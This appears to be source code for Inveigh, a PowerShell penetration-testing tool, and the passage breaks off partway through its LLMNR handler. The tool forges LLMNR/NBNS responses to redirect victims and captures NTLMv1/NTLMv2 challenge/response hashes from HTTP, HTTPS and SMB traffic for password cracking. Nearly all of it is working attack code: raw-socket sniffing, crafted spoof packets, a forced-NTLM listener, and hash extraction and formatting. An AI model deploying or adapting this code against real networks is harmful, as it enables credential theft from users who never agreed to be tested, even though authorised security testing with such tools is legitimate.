function Invoke-Inveigh {
    <#
    .SYNOPSIS
    Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP/SMB.

    .DESCRIPTION
    Inveigh is a Windows PowerShell LLMNR/NBNS spoofer designed to assist penetration testers that find themselves limited to a Windows system. This can commonly occur while performing phishing attacks, USB drive attacks, VLAN pivoting, or simply being restricted to a Windows system as part of client imposed restrictions.

    .PARAMETER IP
    Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the 'SpoofIP' parameter is not set.

    .PARAMETER SpooferIP
    Specify an IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to another system. 

    .PARAMETER HTTP
    Default = Enabled: Enable/Disable HTTP challenge/response capture.

    .PARAMETER HTTPS
    Default = Disabled: Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443. If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.

    .PARAMETER SMB
    Default = Enabled: Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still direct targets to the host system's SMB server.

    .PARAMETER LLMNR
    Default = Enabled: Enable/Disable LLMNR spoofing.

    .PARAMETER NBNS
    Default = Disabled: Enable/Disable NBNS spoofing.

    .PARAMETER NBNSTypes
    Default = 20: Enable/Disable NBNS types. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name

    .PARAMETER Repeat
    Default = Enabled: Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.

    .PARAMETER ForceWPADAuth
    Default = Enabled: Matches Responder option to Enable/Disable authentication for wpad.dat GET requests. Disabling can prevent browser login prompts.

    .PARAMETER Output
    Default = Console/File Output Enabled: Enable/Disable most console output and all file output. 0 = Console Enabled/File Enabled, 1 = Console Enabled/File Disabled, 2 = Console Disabled/File Enabled

    .PARAMETER OutputDir
    Default = Working Directory: Set an output directory for log and capture files.

    .EXAMPLE
    ./Inveigh.ps1
    Execute with all default settings.

    .EXAMPLE
    ./Inveigh.ps1 -IP 192.168.1.10
    Execute specifying a specific local listening/spoofing IP.

    .EXAMPLE
    ./Inveigh.ps1 -IP 192.168.1.10 -HTTP N
    Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.

    .EXAMPLE
    ./Inveigh.ps1 -Repeat N -ForceWPADAuth N
    Execute with the stealthiest options.

    .EXAMPLE
    ./Inveigh.ps1 -HTTP N -LLMNR N
    Execute with LLMNR/NBNS spoofing disabled and challenge/response capture over SMB only. This may be useful for capturing non-Kerberos authentication attempts on a file server.

    .EXAMPLE
    ./Inveigh.ps1 -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
    Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be useful for sending traffic to a controlled Linux system on another subnet. 

    .NOTES
    1. An elevated administrator or SYSTEM shell is needed.
    2. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/SMB NTLMv1/NTLMv2 challenge/response capture.
    3. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
    4. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
    5. HTTP challenge/response captures are performed with a dedicated listener.
    6. The local LLMNR/NBNS services do not need to be disabled on the host system.
    7. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
    8. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
    9. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
    10. Output files will be created in current working directory.
    11. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
    #>

    param
    ( 
        [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$IP = "",
        [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SpooferIP = "",
        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTP="Y",
        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTPS="N",
        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMB="Y",
        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$LLMNR="Y",
        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$NBNS="N",
        [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][array]$NBNSTypes="20",
        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Repeat="Y",
        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ForceWPADAuth="Y",
        [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Output="0",
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]$OutputDir="",
        [parameter(ValueFromRemainingArguments=$true)] $invalid_parameter
    )

    if ($invalid_parameter)
    {
        throw "$($invalid_parameter) is not a valid parameter."
    }

    if(-not($IP))
    { 
        $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
    }

    if(-not($SpooferIP))
    {
        $SpooferIP = $IP  
    }

    if(-not($OutputDir))
    { 
        $output_directory = $PWD.Path
    }
    else
    {
        $output_directory = $OutputDir
    }

    $log_out_file = $output_directory + "\Inveigh-Log.txt"
    $NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
    $NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
    $certificate_thumbprint = "76a49fd27011cf4311fb6914c904c90a89f3e4b2"

    # Write startup messages
    $start_time = Get-Date
    Write-Output "Inveigh started at $(Get-Date -format 's')`n"

    if(($Output -eq 0) -or ($Output -eq 2))
    {
        # "Inveigh started at $(Get-Date -format 's')" |Out-File $log_out_file -Append
    }

    Write-Output "Listening IP Address = $IP`n"
    Write-Output "LLMNR/NBNS Spoofer IP Address = $SpooferIP`n"

    if($LLMNR -eq 'y')
    {
        Write-Output "LLMNR Spoofing Enabled`n"
        $LLMNR_response_message = "- spoofed response has been sent"
    }
    else
    {
        Write-Output "LLMNR Spoofing Disabled`n"
        $LLMNR_response_message = "- LLMNR spoofing is disabled"
    }

    if($NBNS -eq 'y')
    {
        $NBNSTypes_output = $NBNSTypes -join ","
        
        if($NBNSTypes.Count -eq 1)
        {
            Write-Output "NBNS Spoofing Of Type $NBNSTypes_output Enabled`n"
        }
        else
        {
            Write-Output "NBNS Spoofing Of Types $NBNSTypes_output Enabled`n"
        }
        
        $NBNS_response_message = "- spoofed response has been sent"
    }
    else
    {
        Write-Output "NBNS Spoofing Disabled`n"
        $NBNS_response_message = "- NBNS spoofing is disabled"
    }

    if($HTTP -eq 'y')
    {
        Write-Output "HTTP Capture Enabled`n"
    }
    else
    {
        Write-Output "HTTP Capture Disabled`n"
    }

    if($HTTPS -eq 'y')
    {
        try
        {
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.open('ReadWrite')
            $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
            $certificate.import($output_directory + "\inveigh.pfx")
            $certificate_store.add($certificate) 
            $certificate_store.close()
            Invoke-Expression -command "netsh http add sslcert ipport=0.0.0.0:443 certhash=$certificate_thumbprint appid='{00112233-4455-6677-8899-AABBCCDDEEFF}'" > $null
            Write-Output "HTTPS Capture Enabled`n"
        }
        catch
        {
            $certificate_store.close()
            $HTTPS="N"
            Write-Output "HTTPS Capture Disabled Due To Certificate Install Error`n"
        }
    }
    else
    {
        Write-Output "HTTPS Capture Disabled`n"
    }

    if($SMB -eq 'y')
    {
        Write-Output "SMB Capture Enabled`n"
    }
    else
    {
        Write-Output "SMB Capture Disabled`n"
    }

    if($Repeat -eq 'y')
    {
        Write-Output "Spoof Repeating Enabled`n"
    }
    else
    {
        Write-Output "Spoof Repeating Disabled`n"
    }

    if($ForceWPADAuth -eq 'y')
    {
        Write-Output "Force WPAD Authentication Enabled`n"
    }
    else
    {
        Write-Output "Force WPAD Authentication Disabled`n"
    }

    if($Output -eq 0)
    {
        Write-Output "Console Output Enabled`n"
        Write-Output "File Output Enabled`n"
    }
    elseif($Output -eq 1)
    {
        Write-Output "Console Output Enabled`n"
        Write-Output "File Output Disabled`n"
    }
    else
    {
        Write-Output "Console Output Disabled`n"
        Write-Output "File Output Enabled`n"
    }

    # Write-Output "Output Directory = $output_directory"
    # Write-Warning "Press CTRL+C to exit"

    $byte_in = New-Object Byte[] 4	
    $byte_out = New-Object Byte[] 4	
    $byte_data = New-Object Byte[] 4096
    $byte_in[0] = 1  					
    $byte_in[1-3] = 0
    $byte_out[0] = 1
    $byte_out[1-3] = 0

    $hash = [hashtable]::Synchronized(@{})
    $hash.IP_capture_list = @()

    # Sniffer socket setup
    $sniffer_socket = New-Object System.Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::IP )
    $sniffer_socket.SetSocketOption( "IP", "HeaderIncluded", $true )
    $sniffer_socket.ReceiveBufferSize = 1024000
    $end_point = New-Object System.Net.IPEndpoint( [Net.IPAddress]"$IP", 0 )
    $sniffer_socket.Bind( $end_point )
    [void]$sniffer_socket.IOControl( [Net.Sockets.IOControlCode]::ReceiveAll, $byte_in, $byte_out )

    Function DataToUInt16( $field )
    {
    	[Array]::Reverse( $field )
    	return [BitConverter]::ToUInt16( $field, 0 )
    }

    Function DataToUInt32( $field )
    {
    	[Array]::Reverse( $field )
    	return [BitConverter]::ToUInt32( $field, 0 )
    }

    Function DataLength
    {
    param ([int]$length_start,[byte[]]$string_extract_data)
        try{
            $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start+1)],0)
        }
        catch{}
        return $string_length
    }

    Function DataToString
    {
    param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)
        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("=") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }

    # HTTP Server ScriptBlock
    $HTTP_scriptblock = 
    {
         
        param ($listener,$NTLMv1_out_file,$NTLMv2_out_file,$Repeat,$ForceWPADAuth,$Output)
        
        while ($listener.IsListening) {
        $hash.context = $listener.GetContext() 
        $hash.request = $hash.context.Request
        $hash.response = $hash.context.Response
        $hash.message = ''
        
        if ($hash.request.Url -match '/stop$') #temp fix to shutdown listener
        {
            $listener.stop()
            break
        }
        
        Function DataLength
        {
        param ([int]$length_start,[byte[]]$string_extract_data)
        
            try
            {
                $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start+1)],0)
            }
            catch{}
            
            return $string_length
        }

        Function DataToString
        {
        param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)
            $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
            $string_data = $string_data -replace "-00",""
            $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
            $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
            return $string_extract
        }

        try{
            $NTLM_challenge = '1122334455667788'
            $NTLM = 'NTLM'
            
            if($hash.request.IsSecureConnection)
            {
                $HTTP_type = "HTTPS"
            }
            else
            {
                $HTTP_type = "HTTP"
            }
            
            
            if (($hash.request.RawUrl -match '/wpad.dat') -and ($ForceWPADAuth -eq 'n'))
            {
                $hash.response.StatusCode = 200
            }
            else
            {
                $hash.response.StatusCode = 401
            }
                
            [string]$authentication_header = $hash.request.headers.getvalues('Authorization')
            
            if($authentication_header.startswith('NTLM '))
            {
                $authentication_header = $authentication_header -replace 'NTLM ',''
                [byte[]] $HTTP_request_byte = [System.Convert]::FromBase64String($authentication_header)
                $hash.response.StatusCode = 401
                
                if ($HTTP_request_byte[8] -eq 1)
                {
                    $NTLM = 'NTLM TlRMTVNTUAACAAAABgAGADgAAAAFgomiESIzRFVmd4gAAAAAAAAAAIIAggA+AAAABgGxHQAAAA9MAEEAQgACAAYATABBAEIAAQAQAEgATwBTAFQATgBBAE0ARQAEABIAbABhAGIALgBsAG8AYwBhAGwAAwAkAGgAbwBzAHQAbgBhAG0AZQAuAGwAYQBiAC4AbABvAGMAYQBsAAUAEgBsAGEAYgAuAGwAbwBjAGEAbAAHAAgApMf4tnBy0AEAAAAACgo='
                    $hash.response.StatusCode = 401
                }
                elseif ($HTTP_request_byte[8] -eq 3)
                {
                    $NTLM = 'NTLM'
                    $HTTP_NTLM_offset = $HTTP_request_byte[24]
                    $HTTP_NTLM_length = DataLength 22 $HTTP_request_byte
                    $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_byte
                    $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_byte
                            
                    if($HTTP_NTLM_domain_length -eq 0)
                    {
                        $HTTP_NTLM_domain_string = ''
                    }
                    else
                    {  
                        $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_byte
                    } 
                        
                    $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_byte
                    $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_byte
                            
                    $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_byte
                    $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_byte
            
                    if($HTTP_NTLM_length -eq 24) # NTLMv1
                    {
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_byte[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(48,':')
                        $hash.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                        
                        if(($Output -eq 0) -or ($Output -eq 1))
                        {
                            $hash.HTTP_NTLM_hash_msg = $(Get-Date -format 's') + " - $HTTP_type NTLMv1 challenge/response captured from " + $hash.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $hash.HTTP_NTLM_hash
                        }
                        
                        if(($Output -eq 0) -or ($Output -eq 2))
                        {
                            # $hash.host.ui.WriteWarningLine("$HTTP_type NTLMv1 challenge/response written to " + $NTLMv1_out_file)
                            # $hash.HTTP_NTLM_hash |Out-File $NTLMv1_out_file -Append
                        }
                        
                        if (($hash.IP_capture_list -notcontains $hash.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and ($Repeat -eq 'n'))
                        {
                            $hash.IP_capture_list += $hash.request.RemoteEndpoint.Address
                        }
                    }
                    else # NTLMv2
                    {              
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_byte[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(32,':')
                        $hash.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                        
                        if(($Output -eq 0) -or ($Output -eq 1))
                        {
                            $hash.HTTP_NTLM_hash_msg = $(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from " + $hash.request.RemoteEndpoint.address + "(" + $HTTP_NTLM_host_string + "):`n" + $hash.HTTP_NTLM_hash
                        }
                        
                        if(($Output -eq 0) -or ($Output -eq 2))
                        {
                            # $hash.host.ui.WriteWarningLine("$HTTP_type NTLMv2 challenge/response written to " + $NTLMv2_out_file)
                            # $hash.HTTP_NTLM_hash |Out-File $NTLMv2_out_file -Append
                        }
                        
                        if (($hash.IP_capture_list -notcontains $hash.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and ($Repeat -eq 'n'))
                        {
                            $hash.IP_capture_list += $hash.request.RemoteEndpoint.Address
                        }
                    } 
                    $hash.response.StatusCode = 200
                }
                else
                {
                    $NTLM = 'NTLM'
                }
           
            }
            [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($hash.message)
            $hash.response.ContentLength64 = $buffer.length
            $hash.response.AddHeader("WWW-Authenticate",$NTLM)
            $output_stream = $hash.response.OutputStream
            $output_stream.write($buffer, 0, $buffer.length)
            $output_stream.close()
           }
           catch{}
        }
    }

    # HTTP Server
    Function Start-HTTP-Server()
    {
    $listener = New-Object System.Net.HttpListener

    if($HTTP -eq 'y')
    {
        $listener.Prefixes.Add('http://*:80/')
    }

    if(($HTTP -eq 'n') -and ($HTTPS -eq 'y'))
    {
        $listener.Prefixes.Add('http://127.0.0.1:80/')
    }

    if($HTTPS -eq 'y')
    {
        $listener.Prefixes.Add('https://*:443/')
    }

    $listener.AuthenticationSchemes = "Anonymous" 
    $listener.Start()
    $hash.Host = $host
    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.Open()
    $runspace.SessionStateProxy.SetVariable('Hash',$hash)
    $powershell = [powershell]::Create()
    $powershell.Runspace = $runspace
    $powershell.AddScript($HTTP_scriptblock).AddArgument($listener).AddArgument($NTLMv1_out_file).AddArgument($NTLMv2_out_file).AddArgument($Repeat).AddArgument($ForceWPADAuth).AddArgument($Output) > $null
    $handle = $powershell.BeginInvoke()
    }

    # HTTP Server Start
    if(($HTTP -eq 'y') -or ($HTTPS -eq 'y'))
    {
        Start-HTTP-Server
        $web_request = [System.Net.WebRequest]::Create('http://127.0.0.1/stop') # Temp fix for HTTP shutdown
        $web_request.Method = "GET"
    }

    # Main Sniffer Loop
    try
    {
    while( $true )
    {
    try
    {
        $packet_data = $sniffer_socket.Receive( $byte_data, 0, $byte_data.length, [Net.Sockets.SocketFlags]::None )
    }
    catch
    {}

        if ($hash.HTTP_NTLM_hash_msg) {
            # ignore machine account challenge/rsponse hashes
            if(-not ($hash.HTTP_NTLM_hash_msg -like "*`$*")){
                Write-Output $hash.HTTP_NTLM_hash_msg + "`n"
            }
            $hash.HTTP_NTLM_hash_msg = $Null
        }
    	
    	$memory_stream = New-Object System.IO.MemoryStream( $byte_data, 0, $packet_data )
    	$binary_reader = New-Object System.IO.BinaryReader( $memory_stream )
        
        # IP header fields
    	$version_HL = $binary_reader.ReadByte( )
    	$type_of_service= $binary_reader.ReadByte( )
    	$total_length = DataToUInt16 $binary_reader.ReadBytes( 2 )
    	$identification = $binary_reader.ReadBytes( 2 )
    	$flags_offset = $binary_reader.ReadBytes( 2 )
    	$TTL = $binary_reader.ReadByte( )
    	$protocol_number = $binary_reader.ReadByte( )
    	$header_checksum = [Net.IPAddress]::NetworkToHostOrder( $binary_reader.ReadInt16() )
        $source_IP_bytes = $binary_reader.ReadBytes( 4 )
    	$source_IP = [System.Net.IPAddress]$source_IP_bytes
    	$destination_IP_bytes = $binary_reader.ReadBytes( 4 )
    	$destination_IP = [System.Net.IPAddress]$destination_IP_bytes

    	$ip_version = [int]"0x$(('{0:X}' -f $version_HL)[0])"
    	$header_length = [int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch($protocol_number)
        {
        6 {  # TCP
    			$source_port = DataToUInt16 $binary_reader.ReadBytes(2)
    			$destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
    			$sequence_number = DataToUInt32 $binary_reader.ReadBytes(4)
    			$ack_number = DataToUInt32 $binary_reader.ReadBytes(4)
    			$TCP_header_length = [int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
    			$TCP_flags = $binary_reader.ReadByte()
    			$TCP_window = DataToUInt16 $binary_reader.ReadBytes(2)
    			$TCP_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
    			$TCP_urgent_pointer = DataToUInt16 $binary_reader.ReadBytes(2)
                
    			$payload_data = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
    	   }       
        17 {  # UDP
    			$source_port =  $binary_reader.ReadBytes(2)
                $source_port_2 = DataToUInt16 ($source_port)
    			$destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
    			$UDP_length = $binary_reader.ReadBytes(2)
                $UDP_length_2  = DataToUInt16 ($UDP_length)
    			[void]$binary_reader.ReadBytes(2)
                
    			$payload_data = $binary_reader.ReadBytes(($UDP_length_2 - 2) * 4)
           }
        }
        
        # Incoming packets 
        switch ($destination_port)
        {
        137 { # NBNS
            if($payload_data[5] -eq 1)
            {
                try
                {
                    $UDP_length[0] += 16
                    [Byte[]] $NBNS_response_data = $payload_data[13..$payload_data.length]
                    $NBNS_response_data += (0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00)
                    $NBNS_response_data += ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()
                    $NBNS_response_data += (0x00,0x00,0x00,0x00)
                
                    [Byte[]] $NBNS_response_packet = (0x00,0x89)
                    $NBNS_response_packet += $source_port[1,0]
                    $NBNS_response_packet += $UDP_length[1,0]
                    $NBNS_response_packet += (0x00,0x00)
                    $NBNS_response_packet += $payload_data[0,1]
                    $NBNS_response_packet += (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)
                    $NBNS_response_packet += $NBNS_response_data
                
                    $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                    $send_socket.SendBufferSize = 1024
                    $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
                    
                    $NBNS_query_type = [System.BitConverter]::ToString($payload_data[43..44])
                    
                    switch ($NBNS_query_type)
                    {
                    '41-41' {
                        $NBNS_query_type = '00'
                        }
                    '41-44' {
                        $NBNS_query_type = '03'
                        }
                    '43-41' {
                        $NBNS_query_type = '20'
                        }
                    '42-4C' {
                        $NBNS_query_type = '1B'
                        }
                    '42-4D' {
                        $NBNS_query_type = '1C'
                        }
                    '42-4E' {
                        $NBNS_query_type = '1D'
                        }
                    '42-4F' {
                        $NBNS_query_type = '1E'
                        }
                    }
      
                    if($NBNS -eq 'y')
                    {
                        if ($NBNSTypes -contains $NBNS_query_type)
                        { 
                            if ($hash.IP_capture_list -notcontains $source_IP)
                            {
                                [void]$send_socket.sendTo( $NBNS_response_packet, $destination_point )
                                $send_socket.Close( )
                                $NBNS_response_message = "- spoofed response has been sent"
                            }
                            else
                            {
                                $NBNS_response_message = "- spoof suppressed due to previous capture"
                            }
                        }
                        else
                        {
                            $NBNS_response_message = "- spoof not sent due to disabled type"
                        }
                    }
                
                    $NBNS_query = [System.BitConverter]::ToString($payload_data[13..$payload_data.length])
                    $NBNS_query = $NBNS_query -replace "-00",""
                    $NBNS_query = $NBNS_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                    $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
                        
                    $NBNS_query_string_subtracted = ""
                    $NBNS_query_string = ""
                    $n = 0
                    do
                    {
                        $NBNS_query_string_sub = (([byte][char]($NBNS_query_string_encoded.Substring($n,1)))-65)
                        $NBNS_query_string_subtracted += ([convert]::ToString($NBNS_query_string_sub,16))
                        $n += 1
                    }
                    until($n -gt ($NBNS_query_string_encoded.Length - 1))
                    $n = 0
                    do
                    {
                        $NBNS_query_string += ([char]([convert]::toint16($NBNS_query_string_subtracted.Substring($n,2),16)))
                        $n += 2
                    }
                    until($n -gt ($NBNS_query_string_subtracted.Length - 1))
                    
                    if(($Output -eq 0) -or ($Output -eq 1))
                    {
                        if ((-not ($NBNS_response_message.toString() -like "*NBNS spoofing is disabled")) -and (-not ($NBNS_response_message.toString() -like "spoof not sent due to disabled type"))) {
                            Write-Output "$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message`n"
                        }
                    }
                    
                    if(($Output -eq 0) -or ($Output -eq 2))
                    {
                        # "$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message" |Out-File $log_out_file -Append
                    }
                    
                }
                catch{}
            }
        }
        445 { # SMB
            if($SMB -eq 'y')
            {
                # SMB versions
                if ($payload_data[4] -eq 255)
                {
                    $smb_version_offset = 0
                    $NTLMv1_string_start = 147
                    $NTLMv2_string_start = 151
                }
                else
                {
                    $smb_version_offset = 34
                    $NTLMv1_string_start = 163
                    $NTLMv2_string_start = 167
                }
            
                if (($payload_data[(87 + $smb_version_offset)] -eq 3) -and ($payload_data[(88 + $smb_version_offset)..(90 + $smb_version_offset)] -eq 0))
                {
                    $NTLMv2_offset = $payload_data[(103 + $smb_version_offset)] + (79 + $smb_version_offset)
                    
                    $NTLMv2_length = DataLength (101 + $smb_version_offset) $payload_data    
                    $NTLMv2_domain_length = DataLength (107 + $smb_version_offset) $payload_data
                    $NTLMv2_domain_string = DataToString $NTLMv2_domain_length 0 0 ($NTLMv2_string_start + $smb_version_offset) $payload_data
                            
                    $NTLMv2_user_length = DataLength (115 + $smb_version_offset) $payload_data
                    $NTLMv2_user_string = DataToString $NTLMv2_user_length $NTLMv2_domain_length 0 ($NTLMv2_string_start + $smb_version_offset) $payload_data
                            
                    $NTLMv2_host_length = DataLength (123 + $smb_version_offset) $payload_data
                    $NTLMv2_host_string = DataToString $NTLMv2_host_length $NTLMv2_user_length $NTLMv2_domain_length ($NTLMv2_string_start + $smb_version_offset) $payload_data

                    $NTLMv2_response = [System.BitConverter]::ToString($payload_data[$NTLMv2_offset..($NTLMv2_offset + $NTLMv2_length - 1)]) -replace "-",""
                    $NTLMv2_response = $NTLMv2_response.Insert(32,':')
                    $NTLMv2_hash = $NTLMv2_user_string + "::" + $NTLMv2_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
                    
                    if(($Output -eq 0) -or ($Output -eq 1))
                    {      
                        Write-Output "$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLMv2_host_string):`n$ntlmv2_hash`n"
                    }
                    
                    if(($Output -eq 0) -or ($Output -eq 2))
                    {
                        # write-warning "SMB NTLMv2 challenge/response written to $NTLMv2_out_file"
                        # $NTLMv2_hash |Out-File $NTLMv2_out_file -Append
                    }
                    
                    if (($hash.IP_capture_list -notcontains $source_IP) -and (-not $NTLMv2_user_string.EndsWith('$')) -and ($Repeat -eq 'n'))
                    {
                        $hash.IP_capture_list += $source_IP
                    }
                }
                elseif (($payload_data[(83 + $smb_version_offset)] -eq 3) -and ($payload_data[(84 + $smb_version_offset)..(86 + $smb_version_offset)] -eq 0))
                {
                    $NTLMv1_offset = $payload_data[(99 + $smb_version_offset)] + (51 + $smb_version_offset)
                    $NTLMv1_length = DataLength (95 + $smb_version_offset) $payload_data
                    $NTLMv1_length += $NTLMv1_length
                            
                    $NTLMv1_domain_length = DataLength (103 + $smb_version_offset) $payload_data
                    $NTLMv1_domain_string = DataToString $NTLMv1_domain_length 0 0 ($NTLMv1_string_start + $smb_version_offset) $payload_data
                            
                    $NTLMv1_user_length = DataLength (111 + $smb_version_offset) $payload_data
                    $NTLMv1_user_string = DataToString $NTLMv1_user_length $NTLMv1_domain_length 0 ($NTLMv1_string_start + $smb_version_offset) $payload_data
                            
                    $NTLMv1_host_length = DataLength (119 + $smb_version_offset) $payload_data
                    $NTLMv1_host_string = DataToString $NTLMv1_host_length $NTLMv1_user_length $NTLMv1_domain_length ($NTLMv1_string_start + $smb_version_offset) $payload_data
                            
                    $NTLMv1_response = [System.BitConverter]::ToString($payload_data[$NTLMv1_offset..($NTLMv1_offset + $NTLMv1_length - 1)]) -replace "-",""
                    $NTLMv1_response = $NTLMv1_response.Insert(48,':')
                    $NTLMv1_hash = $NTLMv1_user_string + "::" + $NTLMv1_domain_string + ":" + $NTLMv1_response + ":" + $NTLM_challenge
                    
                    if(($Output -eq 0) -or ($Output -eq 1))
                    {    
                        Write-Output "$(Get-Date -format 's') - SMB NTLMv1 challenge/response captured from $source_IP($NTLMv1_host_string):`n$NTLMv1_hash`n"
                    }
                    
                    if(($Output -eq 0) -or ($Output -eq 2))
                    {
                        # write-warning "SMB NTLMv1 challenge/response written to $NTLMv1_out_file"
                        # $NTLMv1_hash |Out-File $NTLMv1_out_file -Append
                    }
                    
                    if (($hash.IP_capture_list -notcontains $source_IP) -and (-not $NTLMv1_user_string.EndsWith('$')) -and ($Repeat -eq 'n'))
                    {
                        $hash.IP_capture_list += $source_IP
                    }
                }
            }
        }
        5355 { # LLMNR
             $UDP_length[0] += $payload_data.length - 2
             [Byte[]] $LLMNR_response_data = $payload_data[12..$payload_data.length]
             $LLMNR_response_data += $LLMNR_response_data
             $LLMNR_response_data += (0x00,0x00,0x00,0x1e,0x00,0x04)
             $LLMNR_response_data += ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()
                
             [Byte[]] $LLMNR_response_packet = (0x14,0xeb)
             $LLMNR_response_packet += $source_port[1,0]
             $LLMNR_response_packet += $UDP_length[1,0]
             $LLMNR_response_packet += (0x00,0x00)
             $LLMNR_response_packet += $payload_data[0,1]
             $LLMNR_response_packet += (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)
             $LLMNR_response_packet += $LLMNR_response_data
                
